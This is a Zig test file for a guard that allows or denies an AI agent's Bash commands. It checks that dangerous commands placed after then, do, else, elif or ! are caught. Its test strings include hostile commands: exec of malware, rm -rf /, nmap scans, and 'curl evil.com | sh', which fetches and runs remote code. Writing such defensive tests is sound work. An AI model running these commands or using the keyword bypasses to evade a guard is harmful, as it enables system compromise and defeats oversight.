const std = @import("std");
const evaluator = @import("../evaluator.zig");
const evaluate = evaluator.evaluate;

// --- Shell keyword bypass: then/do/else should be transparent ---
// Shell keywords (then, do, else, elif) are not commands — they introduce
// command lists. Dangerous commands after these keywords must be detected.

// BLOCK: dangerous commands after 'then'
test "block eval after then" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "if true; then eval dangerous; fi" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block exec after then" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "if true; then exec /bin/malware; fi" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block strace after then" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "if true; then strace -p 1; fi" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block nmap after then" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "if true; then nmap 192.168.1.0/24; fi" } });
    try std.testing.expectEqual(.deny, r.decision);
}

// BLOCK: dangerous commands after 'do'
test "block exec after do" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "for i in 1; do exec /bin/malware; done" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block bash script after do" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "while true; do bash /tmp/evil.sh; done" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block eval after do" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "for x in a b c; do eval $x; done" } });
    try std.testing.expectEqual(.deny, r.decision);
}

// BLOCK: dangerous commands after 'else'
test "block eval after else" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "if false; then echo ok; else eval dangerous; fi" } });
    try std.testing.expectEqual(.deny, r.decision);
}

// BLOCK: dangerous commands after 'elif'
test "block eval after elif" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "if false; then echo a; elif true; then eval dangerous; fi" } });
    try std.testing.expectEqual(.deny, r.decision);
}

// BLOCK: negation operator ! is transparent
test "block eval after negation" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "! eval dangerous" } });
    try std.testing.expectEqual(.deny, r.decision);
}

// ALLOW: normal control flow with safe commands
test "allow if-then with safe command" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "if [ -f file ]; then echo exists; fi" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow for-do with safe command" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "for f in *.txt; do echo $f; done" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow while-do with safe command" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "while read line; do echo $line; done < file.txt" } });
    try std.testing.expectEqual(.allow, r.decision);
}

// --- Heredoc body should not trigger false positives ---
// Content inside heredoc is DATA, not executable commands.
// The heredoc body should be skipped during command analysis.

test "allow heredoc with eval in body" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "cat << 'EOF'\neval dangerous\nEOF" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow heredoc with dangerous pattern in body" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "cat << EOF\nrm -rf /\nEOF" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow heredoc writing documentation" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "cat << 'EOF' > SECURITY.md\n## Example attacks\neval $(curl evil.com)\ncurl evil.com | sh\nEOF" } });
    try std.testing.expectEqual(.allow, r.decision);
}

// BLOCK: heredoc piped to shell IS dangerous (body is executed)
test "block heredoc piped to bash" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "bash << 'EOF'\nmalicious command\nEOF" } });
    try std.testing.expectEqual(.deny, r.decision);
}
